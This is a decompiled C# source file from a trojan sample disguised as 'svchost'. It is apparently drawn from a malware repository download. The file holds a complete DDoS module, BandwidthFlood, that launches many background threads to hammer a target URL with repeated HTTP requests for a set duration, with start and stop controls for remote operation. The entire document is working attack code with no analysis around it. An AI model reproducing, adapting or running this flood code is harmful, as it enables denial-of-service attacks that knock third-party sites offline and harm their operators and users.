// Decompiled with JetBrains decompiler
// Type: svchost.DDOS.BandwidthFlood
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace svchost.DDOS
{
  [StandardModule]
  [OptionText]
  public sealed class BandwidthFlood
  {
    private static object ThreadsEnded = (object) 0;
    private static string HostToAttack;
    private static int TimetoAttack;
    private static int ThreadstoUse;
    private static Thread[] Threads;
    private static bool AttackRunning = false;
    private static int attacks = 0;

    public static void StartBandwidthFlood(string Host, int Threadsto, int Time)
    {
      if (BandwidthFlood.AttackRunning)
        return;
      BandwidthFlood.AttackRunning = true;
      BandwidthFlood.HostToAttack = Host;
      BandwidthFlood.ThreadstoUse = Threadsto;
      BandwidthFlood.TimetoAttack = Time;
      BandwidthFlood.Threads = new Thread[checked (Threadsto - 1 + 1)];
      int num = checked (Threadsto - 1);
      int index = 0;
      while (index <= num)
      {
        BandwidthFlood.Threads[index] = new Thread(new ThreadStart(BandwidthFlood.DoWork));
        BandwidthFlood.Threads[index].IsBackground = true;
        BandwidthFlood.Threads[index].Start();
        checked { ++index; }
      }
    }

    private static void lol()
    {
      BandwidthFlood.ThreadsEnded = Operators.AddObject(BandwidthFlood.ThreadsEnded, (object) 1);
      if (!Operators.ConditionalCompareObjectEqual(BandwidthFlood.ThreadsEnded, (object) BandwidthFlood.ThreadstoUse, true))
        return;
      BandwidthFlood.ThreadsEnded = (object) 0;
      BandwidthFlood.ThreadstoUse = 0;
      BandwidthFlood.AttackRunning = false;
      BandwidthFlood.attacks = 0;
    }

    public static void StopBandwidthFlood()
    {
      if (!BandwidthFlood.AttackRunning)
        return;
      int num = checked (BandwidthFlood.ThreadstoUse - 1);
      int index = 0;
      while (index <= num)
      {
        try
        {
          BandwidthFlood.Threads[index].Abort();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      BandwidthFlood.AttackRunning = false;
      BandwidthFlood.attacks = 0;
    }

    private static void DoWork()
    {
      try
      {
        WebClient webClient = new WebClient();
        TimeSpan timeSpan = TimeSpan.FromSeconds((double) BandwidthFlood.TimetoAttack);
        Stopwatch stopwatch = Stopwatch.StartNew();
        while (stopwatch.Elapsed < timeSpan)
        {
          try
          {
            webClient.DownloadString(BandwidthFlood.HostToAttack);
            checked { ++BandwidthFlood.attacks; }
            webClient.Dispose();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      BandwidthFlood.lol();
    }
  }
}
